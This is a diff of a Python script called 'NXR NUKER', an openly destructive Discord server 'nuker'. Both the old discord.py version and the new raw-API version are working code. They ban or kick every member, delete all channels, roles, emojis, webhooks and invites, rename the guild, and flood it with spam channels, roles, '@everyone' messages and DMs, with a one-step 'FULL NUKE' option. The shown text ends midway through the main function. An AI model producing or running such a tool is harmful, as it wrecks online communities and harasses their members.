@@ -1,479 +1,623 @@
-# ═══════════════════════════════════════════════════════════
-#  NXR NUKER  ·  by hea
-#  pip install -r requirements.txt
-#  python nxr_nuker.py
-# ═══════════════════════════════════════════════════════════
+# nxr_nuker_protocol.py
+# NXR NUKER PROTOCOL — full-featured Discord guild nuker
+# Python 3.10+ | aiohttp colorama pyyaml
 
-import discord
 import asyncio
+import aiohttp
+import json
 import os
 import sys
 import time
 import random
 import string
-import io
-import json
-import logging
-from typing import Any, Awaitable, Callable, Iterable, Optional
+from pathlib import Path
 
-# ═══════════════════════════════════════════════════════════
-#                        CONFIG
-# ═══════════════════════════════════════════════════════════
+from colorama import init as cinit
+cinit(autoreset=True)
 
-class Config:
-    # ── auth ──
-    TOKEN     = os.getenv("NXR_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
-    GUILD_ID  = int(os.getenv("NXR_GUILD", "0"))
+try:
+    import yaml
+except ImportError:
+    yaml = None
 
-    # ── identity ──
-    SERVER_NAME   = "NXR NUKER"
-    CHANNEL_NAME  = "nxr-nuked"
-    ROLE_NAME     = "NXR"
-    WEBHOOK_NAME  = "NXR"
-    REASON        = "NXR NUKER"
+# -- enable VT on Windows legacy consoles -------------------------------
+if os.name == "nt":
+    os.system("")
 
-    # ── phases ──
-    RENAME_SERVER     = True
-    CHANGE_ICON       = False           # needs ICON_PATH file
-    ICON_PATH         = "icon.png"
+API = "https://discord.com/api/v10"
+UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-    DELETE_CHANNELS   = True
-    DELETE_THREADS    = True
-    DELETE_ROLES      = True
-    DELETE_EMOJIS     = True
-    DELETE_STICKERS   = True
-    DELETE_INVITES    = True
-    DELETE_WEBHOOKS   = True
-    DELETE_EVENTS     = True
+# ----------------------------- CONFIG -----------------------------------
+DEFAULTS = {
+    "nuker": {
+        "reason": "NXR",
+        "concurrency": 6,
+        "fetch_member_limit": 1000,
+        "ban_delete_days": 1,
+        "guild_rename": "NXR NUKED",
+        "spam_channel_name": "nxr",
+        "spam_channel_amount": 50,
+        "spam_channel_type": 0,
+        "spam_channel_concurrency": 3,
+        "spam_role_name": "nxr",
+        "spam_role_amount": 50,
+        "spam_role_color": 0,
+        "spam_message_content": "@everyone NXR",
+        "spam_message_amount": 10,
+        "spam_message_delay": 0.0,
+        "fullnuke_channel_spam_name": "nxr-wiped",
+        "fullnuke_channel_spam_amount": 20,
+        "fullnuke_role_spam_name": "nxr",
+        "fullnuke_role_spam_amount": 20,
+    },
+    "ui": {
+        "gradient_start": [255, 45, 45],
+        "gradient_end":   [165, 0, 255],
+        "accent":  [255, 60, 90],
+        "success": [90, 240, 150],
+        "warn":    [255, 200, 60],
+        "error":   [255, 70, 70],
+        "muted":   [120, 120, 130],
+        "truecolor": True,
+    },
+}
 
-    CREATE_CHANNELS   = True
-    CREATE_ROLES      = True
-    CREATE_WEBHOOKS   = True
 
-    SPAM_MESSAGES     = True
-    SPAM_DMS          = False           # risky — slow
-    BAN_ALL           = True
-    KICK_ALL          = False
-    PRUNE_MEMBERS     = False
+def _merge(base, over):
+    out = dict(base)
+    for k, v in (over or {}).items():
+        if isinstance(v, dict) and isinstance(out.get(k), dict):
+            out[k] = _merge(out[k], v)
+        else:
+            out[k] = v
+    return out
 
-    # ── counts ──
-    CHANNEL_COUNT = 150
-    ROLE_COUNT    = 150
-    WEBHOOK_PER_CH = 1
 
-    # ── text ──
-    SPAM_TEXT = "@everyone **NXR NUKER** owns this server  ·  by hea"
-    DM_TEXT   = "NXR NUKER — you got hit.  ·  by hea"
+def _config_path():
+    # prefer config.yml next to the running exe/script
+    here = Path(getattr(sys, "frozen", False) and Path(sys.executable).parent or Path(__file__).parent)
+    p = here / "config.yml"
+    return p if p.exists() else None
 
-    # ── concurrency ──
-    WORKERS      = 10
-    BAN_WORKERS  = 45
-    DM_WORKERS   = 15
 
-    # ── misc ──
-    COUNTDOWN  = 3
-    LOG_FILE   = "nxr.log"
+def load_config():
+    cfg = DEFAULTS
+    if yaml is None:
+        return cfg
+    path = _config_path()
+    if not path:
+        return cfg
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            cfg = _merge(DEFAULTS, yaml.safe_load(f) or {})
+    except Exception:
+        pass
+    return cfg
 
-# ═══════════════════════════════════════════════════════════
-#                        COLORS
-# ═══════════════════════════════════════════════════════════
 
-class Col:
-    R  = "\033[0m"
-    B  = "\033[1m"
-    D  = "\033[2m"
-    RD = "\033[91m"
-    GR = "\033[92m"
-    YL = "\033[93m"
-    BL = "\033[94m"
-    MG = "\033[95m"
-    CY = "\033[96m"
-    WH = "\033[97m"
-    GY = "\033[90m"
+CFG = load_config()
+N = CFG["nuker"]
+UI = CFG["ui"]
 
-# ═══════════════════════════════════════════════════════════
-#                        BANNER
-# ═══════════════════════════════════════════════════════════
+# ----------------------------- STYLE ------------------------------------
+TRUECOLOR = bool(UI.get("truecolor", True))
 
-BANNER = f"""{Col.CY}{Col.B}
-    ███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗
-    ████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
-    ██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
-    ██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
-    ██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
-    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-{Col.R}{Col.D}{Col.GY}              ─────────────  by {Col.R}{Col.B}{Col.MG}hea{Col.R}{Col.D}{Col.GY}  ─────────────{Col.R}
-"""
 
-# ═══════════════════════════════════════════════════════════
-#                        LOGGER
-# ═══════════════════════════════════════════════════════════
+def rgb(c, fallback=37):
+    if not TRUECOLOR:
+        return f"\x1b[{fallback}m"
+    r, g, b = c
+    return f"\x1b[38;2;{r};{g};{b}m"
 
-logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s %(message)s",
-    handlers=[logging.FileHandler(Config.LOG_FILE, encoding="utf-8")],
-)
-_log = logging.getLogger("nxr")
+
+RESET = "\x1b[0m"
+BOLD = "\x1b[1m"
+DIM = "\x1b[2m"
+
+C_ACCENT = rgb(UI["accent"])
+C_OK = rgb(UI["success"])
+C_WARN = rgb(UI["warn"])
+C_ERR = rgb(UI["error"])
+C_MUTED = rgb(UI["muted"])
+
+
+def _lerp(a, b, t):
+    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))
+
+
+def gradient_line(text, start=None, end=None):
+    """Colour each visible character along a horizontal gradient."""
+    start = start or tuple(UI["gradient_start"])
+    end = end or tuple(UI["gradient_end"])
+    if not TRUECOLOR:
+        return C_ACCENT + text + RESET
+    chars = list(text)
+    n = max(1, len(chars) - 1)
+    out = []
+    for i, ch in enumerate(chars):
+        if ch == " ":
+            out.append(ch)
+            continue
+        col = _lerp(start, end, i / n)
+        out.append(f"\x1b[38;2;{col[0]};{col[1]};{col[2]}m{ch}")
+    out.append(RESET)
+    return "".join(out)
+
+
+def banner():
+    art = [
+        "  ███▄    █ ▒██   ██▒ ██▀███     ███▄    █ ██░ ██  ██▄▀",
+        "  ██ ▀█   █ ▒▒ █ █ ▒░▓██ ▒ ██▒   ██ ▀█   █▓██░ ██▒██▀▄",
+        " ▓██  ▀█ ██▒░░  █   ░▓██ ░▄█ ▒  ▓██  ▀█ ██▒▒██▀▀██░",
+        " ▓██▒  ▐▌██▒ ░ █ █ ▒ ▒██▀▀█▄    ▓██▒  ▐▌██▒░▓█ ░██",
+        " ▒██░   ▓██░▒██▒ ░ ░░██▓ ▒██▒  ▒██░   ▓██░░▓█▒░██▓",
+    ]
+    print()
+    for line in art:
+        print(gradient_line(line))
+    sub = "N X R   N U K E R   P R O T O C O L"
+    tag = "[ v1.0 — full protocol ]"
+    pad = " " * max(0, (len(art[0]) - len(sub)) // 2)
+    print()
+    print(pad + gradient_line(sub))
+    print(" " * max(0, (len(art[0]) - len(tag)) // 2) + C_MUTED + tag + RESET)
+    print()
+
 
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
 
-def log(tag: str, msg: str, color: str = Col.CY):
-    line = f"{Col.GY}[{Col.B}{color}{tag}{Col.R}{Col.GY}]{Col.R} {msg}"
-    print(line, flush=True)
-    _log.info(f"[{tag}] {msg}")
 
-def hr():
-    print(f"{Col.GY}{'─' * 62}{Col.R}")
+def log(tag, msg, color=C_ACCENT):
+    ts = time.strftime("%H:%M:%S")
+    print(f"{C_MUTED}[{ts}]{RESET} {color}{BOLD}[{tag}]{RESET} {msg}")
 
-# ═══════════════════════════════════════════════════════════
-#                        HELPERS
-# ═══════════════════════════════════════════════════════════
 
-RETRYABLE = (asyncio.TimeoutError, ConnectionError, OSError)
+def prompt(msg, default=None):
+    d = f" {C_MUTED}({default}){RESET}" if default is not None else ""
+    val = input(f"{C_ACCENT}➜ {RESET}{msg}{d}: ").strip()
+    return val if val else default
 
-async def safe(coro_fn: Callable[[], Awaitable[Any]],
-               retries: int = 2) -> Optional[Any]:
-    """Never raises. Retries on 5xx / network errors. Swallows 4xx."""
-    for attempt in range(retries + 1):
-        try:
-            return await coro_fn()
-        except discord.Forbidden:
-            return None
-        except discord.NotFound:
-            return None
-        except discord.HTTPException as e:
-            if 500 <= getattr(e, "status", 0) < 600 and attempt < retries:
-                await asyncio.sleep(0.4 * (attempt + 1))
-                continue
-            return None
-        except RETRYABLE:
-            if attempt < retries:
-                await asyncio.sleep(0.4 * (attempt + 1))
-                continue
-            return None
-        except asyncio.CancelledError:
-            raise
-        except Exception:
-            return None
 
-async def pool(items: Iterable, worker: Callable, limit: int) -> list:
-    """Bounded-concurrency map with full exception safety."""
-    items = list(items)
-    sem = asyncio.Semaphore(limit)
-    results = [None] * len(items)
+# ----------------------------- CORE -------------------------------------
+class NXRNuker:
+    def __init__(self, token, guild_id):
+        self.token = token.strip()
+        self.guild_id = str(guild_id).strip()
+        self.headers = {
+            "Authorization": self.token,
+            "User-Agent": UA,
+            "Content-Type": "application/json",
+        }
+        self.session = None
 
-    async def _run(i: int, x):
-        async with sem:
-            results[i] = await worker(x)
+    async def __aenter__(self):
+        self.session = aiohttp.ClientSession(headers=self.headers)
+        return self
 
-    await asyncio.gather(*[_run(i, x) for i, x in enumerate(items)],
-                         return_exceptions=True)
-    return results
+    async def __aexit__(self, *a):
+        await self.session.close()
 
-def randstr(n: int = 8) -> str:
-    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
-
-# ═══════════════════════════════════════════════════════════
-#                        NUKER
-# ═══════════════════════════════════════════════════════════
-
-class Nuker:
-    def __init__(self, guild: discord.Guild):
-        self.g = guild
-        self.t0 = time.time()
-        self.stats = {}
-
-    # ── phase 1 : rename + icon ─────────────────────────
-    async def phase_identity(self):
-        log("PH1", "identity  ·  rename + icon", Col.MG)
-        if Config.RENAME_SERVER:
-            ok = await safe(lambda: self.g.edit(name=Config.SERVER_NAME,
-                                                reason=Config.REASON))
-            log("OK ", f"renamed  →  {Col.YL}{Config.SERVER_NAME}{Col.R}", Col.GR)
-
-        if Config.CHANGE_ICON and os.path.isfile(Config.ICON_PATH):
-            with open(Config.ICON_PATH, "rb") as f:
-                data = f.read()
-            await safe(lambda: self.g.edit(icon=data, reason=Config.REASON))
-            log("OK ", "icon changed", Col.GR)
-
-    # ── phase 2 : destroy ───────────────────────────────
-    async def phase_destroy(self):
-        log("PH2", "destroy  ·  channels / roles / emojis / stickers", Col.RD)
-        g = self.g
-
-        # channels + threads
-        if Config.DELETE_CHANNELS:
-            channels = list(g.channels)
-
-            if Config.DELETE_THREADS:
-                threads = []
-                for ch in channels:
-                    threads.extend(getattr(ch, "threads", []) or [])
-                if threads:
-                    await pool(threads,
-                               lambda t: safe(lambda: t.delete()),
-                               Config.WORKERS)
-                    log("DEL", f"threads    x{len(threads)}", Col.RD)
-
-            await pool(channels,
-                       lambda c: safe(lambda: c.delete()),
-                       Config.WORKERS)
-            log("DEL", f"channels   x{len(channels)}", Col.RD)
-
-        # roles
-        if Config.DELETE_ROLES:
-            roles = [r for r in g.roles
-                     if r != g.default_role and not r.managed]
-            await pool(roles,
-                       lambda r: safe(lambda: r.delete()),
-                       Config.WORKERS)
-            log("DEL", f"roles      x{len(roles)}", Col.RD)
-
-        # emojis
-        if Config.DELETE_EMOJIS:
-            emojis = list(g.emojis)
-            if emojis:
-                await pool(emojis,
-                           lambda e: safe(lambda: e.delete()),
-                           Config.WORKERS)
-            log("DEL", f"emojis     x{len(emojis)}", Col.RD)
-
-        # stickers
-        if Config.DELETE_STICKERS:
-            stickers = list(g.stickers)
-            if stickers:
-                await pool(stickers,
-                           lambda s: safe(lambda: s.delete()),
-                           Config.WORKERS)
-            log("DEL", f"stickers   x{len(stickers)}", Col.RD)
-
-        # webhooks (existing)
-        if Config.DELETE_WEBHOOKS:
+    async def _req(self, method, path, **kwargs):
+        url = f"{API}{path}"
+        for _ in range(5):
             try:
-                hooks = [w async for w in g.webhooks()]
+                async with self.session.request(method, url, **kwargs) as r:
+                    if r.status == 429:
+                        data = await r.json()
+                        await asyncio.sleep(data.get("retry_after", 2) + 0.2)
+                        continue
+                    if r.status in (200, 201, 204):
+                        try:
+                            return await r.json()
+                        except Exception:
+                            return {}
+                    return {"error": r.status, "text": await r.text()}
             except Exception:
-                hooks = []
-            if hooks:
-                await pool(hooks,
-                           lambda w: safe(lambda: w.delete()),
-                           Config.WORKERS)
-            log("DEL", f"webhooks   x{len(hooks)}", Col.RD)
+                await asyncio.sleep(1)
+        return {"error": "failed"}
 
-        # invites
-        if Config.DELETE_INVITES:
-            try:
-                invs = [i async for i in g.invites()]
-            except Exception:
-                invs = []
-            if invs:
-                await pool(invs,
-                           lambda i: safe(lambda: i.delete()),
-                           Config.WORKERS)
-            log("DEL", f"invites    x{len(invs)}", Col.RD)
+    # -- recon --
+    async def fetch_guild(self):
+        return await self._req("GET", f"/guilds/{self.guild_id}?with_counts=true")
 
-        # scheduled events
-        if Config.DELETE_EVENTS:
-            events = list(g.scheduled_events)
-            if events:
-                await pool(events,
-                           lambda e: safe(lambda: e.delete()),
-                           Config.WORKERS)
-            log("DEL", f"events     x{len(events)}", Col.RD)
+    async def fetch_channels(self):
+        return await self._req("GET", f"/guilds/{self.guild_id}/channels")
 
-    # ── phase 3 : create ────────────────────────────────
-    async def phase_create(self):
-        log("PH3", "create  ·  channels / roles / webhooks", Col.CY)
-        g = self.g
-        new_channels = []
+    async def fetch_roles(self):
+        return await self._req("GET", f"/guilds/{self.guild_id}/roles")
 
-        if Config.CREATE_CHANNELS:
-            async def make_ch(_):
-                return await safe(lambda: g.create_text_channel(
-                    name=Config.CHANNEL_NAME, reason=Config.REASON))
+    async def fetch_emojis(self):
+        return await self._req("GET", f"/guilds/{self.guild_id}/emojis")
 
-            new_channels = [c for c in
-                            await pool(range(Config.CHANNEL_COUNT),
-                                       make_ch, Config.WORKERS)
-                            if isinstance(c, discord.TextChannel)]
-            log("NEW", f"channels   x{len(new_channels)}", Col.CY)
+    async def fetch_members(self, limit=1000):
+        members, after = [], "0"
+        while len(members) < limit:
+            batch = await self._req(
+                "GET", f"/guilds/{self.guild_id}/members?limit=1000&after={after}"
+            )
+            if not isinstance(batch, list) or not batch:
+                break
+            members.extend(batch)
+            after = batch[-1]["user"]["id"]
+            if len(batch) < 1000:
+                break
+            await asyncio.sleep(0.5)
+        return members
 
-        if Config.CREATE_ROLES:
-            async def make_role(_):
-                return await safe(lambda: g.create_role(
-                    name=Config.ROLE_NAME, reason=Config.REASON))
+    # -- bans --
+    async def ban_member(self, uid, reason, delete_days=0):
+        return await self._req(
+            "PUT", f"/guilds/{self.guild_id}/bans/{uid}",
+            data=json.dumps({
+                "delete_message_seconds": delete_days * 86400,
+                "reason": reason,
+            }),
+        )
 
-            roles = await pool(range(Config.ROLE_COUNT),
-                               make_role, Config.WORKERS)
-            roles = [r for r in roles if r]
-            log("NEW", f"roles      x{len(roles)}", Col.CY)
+    async def ban_all(self, members, reason, delete_days=1, concurrency=5):
+        sem = asyncio.Semaphore(concurrency)
+        done = {"ok": 0, "fail": 0}
 
-        if Config.CREATE_WEBHOOKS and new_channels:
-            async def make_hook(ch):
-                for _ in range(Config.WEBHOOK_PER_CH):
-                    await safe(lambda: ch.create_webhook(
-                        name=Config.WEBHOOK_NAME, reason=Config.REASON))
+        async def worker(m):
+            uid = m["user"]["id"]
+            async with sem:
+                r = await self.ban_member(uid, reason, delete_days)
+                if "error" in r:
+                    done["fail"] += 1
+                else:
+                    done["ok"] += 1
+                    log("BAN", f"{m['user'].get('username','?')} ({uid})", C_ERR)
 
-            await pool(new_channels, make_hook, Config.WORKERS)
-            log("NEW", f"webhooks   x{len(new_channels) * Config.WEBHOOK_PER_CH}",
-                Col.CY)
+        await asyncio.gather(*(worker(m) for m in members))
+        return done
 
-        return new_channels
+    # -- kicks --
+    async def kick_member(self, uid, reason):
+        return await self._req(
+            "DELETE", f"/guilds/{self.guild_id}/members/{uid}",
+            data=json.dumps({"reason": reason}),
+        )
 
-    # ── phase 4 : spam messages ─────────────────────────
-    async def phase_spam(self, channels):
-        if not Config.SPAM_MESSAGES or not channels:
+    async def kick_all(self, members, reason, concurrency=5):
+        sem = asyncio.Semaphore(concurrency)
+        ok = 0
+
+        async def worker(m):
+            nonlocal ok
+            async with sem:
+                r = await self.kick_member(m["user"]["id"], reason)
+                if "error" not in r:
+                    ok += 1
+                    log("KICK", m["user"].get("username", "?"), C_WARN)
+
+        await asyncio.gather(*(worker(m) for m in members))
+        return ok
+
+    # -- channels --
+    async def delete_channel(self, cid):
+        return await self._req("DELETE", f"/channels/{cid}")
+
+    async def delete_all_channels(self, channels, concurrency=5):
+        sem = asyncio.Semaphore(concurrency)
+        ok = 0
+
+        async def worker(c):
+            nonlocal ok
+            async with sem:
+                r = await self.delete_channel(c["id"])
+                if "error" not in r:
+                    ok += 1
+                    log("DEL", f"#{c.get('name','?')}", C_ACCENT)
+
+        await asyncio.gather(*(worker(c) for c in channels))
+        return ok
+
+    async def create_channel(self, name, ctype=0):
+        return await self._req(
+            "POST", f"/guilds/{self.guild_id}/channels",
+            data=json.dumps({"name": name, "type": ctype}),
+        )
+
+    async def spam_channels(self, name, amount, ctype=0, concurrency=3):
+        sem = asyncio.Semaphore(concurrency)
+
+        async def worker(i):
+            async with sem:
+                n = f"{name}-{i}" if amount > 1 else name
+                r = await self.create_channel(n, ctype)
+                if "error" not in r:
+                    log("MAKE", n, C_OK)
+
+        await asyncio.gather(*(worker(i) for i in range(amount)))
+
+    # -- roles --
+    async def delete_role(self, rid):
+        return await self._req("DELETE", f"/guilds/{self.guild_id}/roles/{rid}")
+
+    async def delete_all_roles(self, roles, concurrency=5):
+        sem = asyncio.Semaphore(concurrency)
+        ok = 0
+
+        async def worker(r):
+            nonlocal ok
+            if r.get("managed") or r["name"] == "@everyone":
+                return
+            async with sem:
+                res = await self.delete_role(r["id"])
+                if "error" not in res:
+                    ok += 1
+                    log("ROLE-", r["name"], C_ACCENT)
+
+        await asyncio.gather(*(worker(r) for r in roles))
+        return ok
+
+    async def create_role(self, name, color=0, hoist=False, mentionable=False):
+        return await self._req(
+            "POST", f"/guilds/{self.guild_id}/roles",
+            data=json.dumps({
+                "name": name, "color": color,
+                "hoist": hoist, "mentionable": mentionable,
+            }),
+        )
+
+    async def spam_roles(self, name, amount, color=0):
+        for i in range(amount):
+            n = f"{name}-{i}" if amount > 1 else name
+            r = await self.create_role(n, color)
+            if "error" not in r:
+                log("ROLE+", n, C_OK)
+
+    # -- messages --
+    async def send_message(self, cid, content):
+        return await self._req(
+            "POST", f"/channels/{cid}/messages",
+            data=json.dumps({"content": content}),
+        )
+
+    async def spam_messages(self, cid, content, amount, delay=0.0):
+        sent = 0
+        for _ in range(amount):
+            r = await self.send_message(cid, content)
+            if "error" not in r:
+                sent += 1
+            if delay:
+                await asyncio.sleep(delay)
+        log("MSG", f"{sent}/{amount} → {cid}", C_OK)
+        return sent
+
+    # -- guild edit --
+    async def rename_guild(self, name):
+        return await self._req(
+            "PATCH", f"/guilds/{self.guild_id}",
+            data=json.dumps({"name": name}),
+        )
+
+    async def delete_emojis(self, emojis):
+        for e in emojis:
+            await self._req("DELETE", f"/guilds/{self.guild_id}/emojis/{e['id']}")
+            log("EMOJI-", e.get("name", "?"), C_ACCENT)
+
+
+# ----------------------------- UI ---------------------------------------
+def box_top(w=50):
+    return gradient_line("╔" + "═" * w + "╗")
+
+
+def box_bot(w=50):
+    return gradient_line("╚" + "═" * w + "╝")
+
+
+def box_sep(w=50):
+    return gradient_line("╠" + "═" * w + "╣")
+
+
+def box_row(text, w=50):
+    # visible width = len(text) (no ANSI yet)
+    pad = w - len(text) - 1
+    return gradient_line("║") + " " + text + " " * pad + gradient_line("║")
+
+
+def draw_menu():
+    w = 50
+    print()
+    print(box_top(w))
+    print(box_row("  NXR NUKER PROTOCOL  —  ACTION MENU", w))
+    print(box_sep(w))
+    items = [
+        ("1",  "Ban All Members"),
+        ("2",  "Kick All Members"),
+        ("3",  "Delete All Channels"),
+        ("4",  "Spam Channels"),
+        ("5",  "Delete All Roles"),
+        ("6",  "Spam Roles"),
+        ("7",  "Spam Messages"),
+        ("8",  "Rename Guild"),
+        ("9",  "Delete All Emojis"),
+        ("10", "FULL NUKE  (ban + wipe + spam + rename)"),
+        ("0",  "Exit"),
+    ]
+    for key, label in items:
+        num = f"{C_ACCENT}[{key:>2}]{RESET}"
+        print(gradient_line("║") + f"  {num}  {label}")
+    print(box_bot(w))
+    print()
+
+
+def header(txt):
+    print()
+    print(gradient_line(f"── {txt} " + "─" * max(0, 46 - len(txt))))
+
+
+# ----------------------------- ACTIONS ----------------------------------
+async def act_ban(n):
+    header("BAN ALL MEMBERS")
+    reason = prompt("reason", N["reason"])
+    dd = int(prompt("delete message days (0-7)", str(N["ban_delete_days"])))
+    conc = int(prompt("concurrency", str(N["concurrency"])))
+    log("SCAN", "fetching members...", C_WARN)
+    members = await n.fetch_members(N["fetch_member_limit"])
+    log("SCAN", f"{len(members)} members", C_WARN)
+    res = await n.ban_all(members, reason, dd, conc)
+    log("DONE", f"banned {res['ok']}  failed {res['fail']}", C_OK)
+
+
+async def act_kick(n):
+    header("KICK ALL MEMBERS")
+    reason = prompt("reason", N["reason"])
+    conc = int(prompt("concurrency", str(N["concurrency"])))
+    members = await n.fetch_members(N["fetch_member_limit"])
+    log("SCAN", f"{len(members)} members", C_WARN)
+    ok = await n.kick_all(members, reason, conc)
+    log("DONE", f"kicked {ok}", C_OK)
+
+
+async def act_del_chans(n):
+    header("DELETE ALL CHANNELS")
+    conc = int(prompt("concurrency", str(N["concurrency"])))
+    chans = await n.fetch_channels()
+    log("SCAN", f"{len(chans)} channels", C_WARN)
+    ok = await n.delete_all_channels(chans, conc)
+    log("DONE", f"deleted {ok}", C_OK)
+
+
+async def act_spam_chans(n):
+    header("SPAM CHANNELS")
+    name = prompt("channel name", N["spam_channel_name"])
+    amt = int(prompt("amount", str(N["spam_channel_amount"])))
+    ctype = int(prompt("type 0=text 2=voice", str(N["spam_channel_type"])))
+    conc = int(prompt("concurrency", str(N["spam_channel_concurrency"])))
+    await n.spam_channels(name, amt, ctype, conc)
+    log("DONE", f"channel spam complete", C_OK)
+
+
+async def act_del_roles(n):
+    header("DELETE ALL ROLES")
+    conc = int(prompt("concurrency", str(N["concurrency"])))
+    roles = await n.fetch_roles()
+    ok = await n.delete_all_roles(roles, conc)
+    log("DONE", f"deleted {ok} roles", C_OK)
+
+
+async def act_spam_roles(n):
+    header("SPAM ROLES")
+    name = prompt("role name", N["spam_role_name"])
+    amt = int(prompt("amount", str(N["spam_role_amount"])))
+    col = int(prompt("color int (0 = none)", str(N["spam_role_color"])))
+    await n.spam_roles(name, amt, col)
+    log("DONE", "role spam complete", C_OK)
+
+
+async def act_spam_msgs(n):
+    header("SPAM MESSAGES")
+    chans = await n.fetch_channels()
+    text = [c for c in chans if c.get("type") == 0]
+    print(f"  {C_MUTED}text channels: {len(text)}{RESET}")
+    cid = prompt("channel id (or 'all')", "all")
+    content = prompt("message", N["spam_message_content"])
+    amt = int(prompt("messages per channel", str(N["spam_message_amount"])))
+    delay = float(prompt("delay (s)", str(N["spam_message_delay"])))
+    targets = text if cid == "all" else [c for c in text if c["id"] == cid]
+    for t in targets:
+        await n.spam_messages(t["id"], content, amt, delay)
+    log("DONE", "message spam complete", C_OK)
+
+
+async def act_rename(n):
+    header("RENAME GUILD")
+    name = prompt("new guild name", N["guild_rename"])
+    await n.rename_guild(name)
+    log("DONE", f"renamed → {name}", C_OK)
+
+
+async def act_del_emojis(n):
+    header("DELETE ALL EMOJIS")
+    emojis = await n.fetch_emojis()
+    if isinstance(emojis, list):
+        log("SCAN", f"{len(emojis)} emojis", C_WARN)
+        await n.delete_emojis(emojis)
+    log("DONE", "emojis cleared", C_OK)
+
+
+async def act_full_nuke(n):
+    header("FULL NUKE")
+    reason = prompt("ban reason", N["reason"])
+    conc = int(prompt("concurrency", str(N["concurrency"])))
+    log("NUKE", "fetching members + channels + roles...", C_ERR)
+    members, chans, roles = await asyncio.gather(
+        n.fetch_members(N["fetch_member_limit"]),
+        n.fetch_channels(),
+        n.fetch_roles(),
+    )
+    log("NUKE", f"{len(members)} members | {len(chans)} channels | {len(roles)} roles", C_ERR)
+
+    await asyncio.gather(
+        n.ban_all(members, reason, N["ban_delete_days"], conc),
+        n.delete_all_channels(chans, conc),
+        n.delete_all_roles(roles, conc),
+    )
+    await n.rename_guild(N["guild_rename"])
+    await n.spam_channels(
+        N["fullnuke_channel_spam_name"],
+        N["fullnuke_channel_spam_amount"],
+        0, N["spam_channel_concurrency"],
+    )
+    await n.spam_roles(N["fullnuke_role_spam_name"], N["fullnuke_role_spam_amount"])
+    log("DONE", "full nuke complete", C_OK)
+
+
+ACTIONS = {
+    "1": act_ban,
+    "2": act_kick,
+    "3": act_del_chans,
+    "4": act_spam_chans,
+    "5": act_del_roles,
+    "6": act_spam_roles,
+    "7": act_spam_msgs,
+    "8": act_rename,
+    "9": act_del_emojis,
+    "10": act_full_nuke,
+}
+
+
+async def menu(n):
+    while True:
+        draw_menu()
+        c = prompt("select", "0")
+        if c == "0":
+            print(f"\n{C_MUTED}exiting.{RESET}\n")
             return
-        log("PH4", "spam  ·  messages", Col.CY)
+        fn = ACTIONS.get(c)
+        if not fn:
+            log("ERR", "unknown option", C_ERR)
+            continue
+        try:
+            await fn(n)
+        except Exception as e:
+            log("ERR", f"{type(e).__name__}: {e}", C_ERR)
 
-        async def send(ch):
-            # keep posting until cancelled or channel dies
-            while True:
-                r = await safe(lambda: ch.send(Config.SPAM_TEXT))
-                if r is None:
-                    return
-                await asyncio.sleep(0.6)
 
-        # run forever in background
-        for ch in channels:
-            asyncio.create_task(send(ch))
-
-        log("OK ", f"spam running on x{len(channels)}", Col.GR)
-
-    # ── phase 5 : ban / kick / prune ────────────────────
-    async def phase_members(self):
-        g = self.g
-
-        if Config.BAN_ALL:
-            log("PH5", "ban  ·  everyone", Col.RD)
-            members = [m for m in g.members
-                       if m.id != g.me.id and not m.bot is False or True]
-            # include bots too; exclude self
-            members = [m for m in g.members if m.id != g.me.id]
-
-            async def do_ban(m):
-                return await safe(lambda: m.ban(
-                    reason=Config.REASON, delete_message_seconds=0))
-
-            await pool(members, do_ban, Config.BAN_WORKERS)
-            log("BAN", f"members    x{len(members)}", Col.RD)
-
-        elif Config.KICK_ALL:
-            log("PH5", "kick  ·  everyone", Col.RD)
-            members = [m for m in g.members if m.id != g.me.id]
-
-            async def do_kick(m):
-                return await safe(lambda: m.kick(reason=Config.REASON))
-
-            await pool(members, do_kick, Config.BAN_WORKERS)
-            log("KIK", f"members    x{len(members)}", Col.RD)
-
-        if Config.PRUNE_MEMBERS:
-            await safe(lambda: g.prune_members(
-                days=7, reason=Config.REASON))
-            log("PRN", "prune      requested", Col.YL)
-
-        if Config.SPAM_DMS:
-            log("PH5", "dm  ·  everyone", Col.YL)
-            members = [m for m in g.members
-                       if m.id != g.me.id and not m.bot]
-
-            async def do_dm(m):
-                ch = await safe(lambda: m.create_dm())
-                if ch:
-                    await safe(lambda: ch.send(Config.DM_TEXT))
-
-            await pool(members, do_dm, Config.DM_WORKERS)
-            log("DM ", f"members    x{len(members)}", Col.YL)
-
-    # ── orchestrator ────────────────────────────────────
-    async def run(self):
-        hr()
-        log("NXR", f"target  ·  {Col.WH}{self.g.name}{Col.R}  "
-                   f"{Col.GY}({self.g.id}){Col.R}", Col.MG)
-        hr()
-
-        await self.phase_identity()
-        await self.phase_destroy()
-        new_ch = await self.phase_create()
-        await self.phase_spam(new_ch)
-        await self.phase_members()
-
-        dt = time.time() - self.t0
-        hr()
-        log("NXR", f"complete in {Col.B}{Col.MG}{dt:.2f}s{Col.R}", Col.MG)
-        hr()
-
-# ═══════════════════════════════════════════════════════════
-#                        BOT
-# ═══════════════════════════════════════════════════════════
-
-intents = discord.Intents.default()
-intents.guilds = True
-intents.members = True
-intents.message_content = True
-intents.guild_messages = True
-intents.guild_reactions = True
-intents.voice_states = True
-
-bot = discord.Client(intents=intents)
-_run_once = False
-
-@bot.event
-async def on_ready():
-    global _run_once
+async def main():
     clear()
-    if os.name == "nt":
-        os.system("title NXR NUKER")
-    print(BANNER)
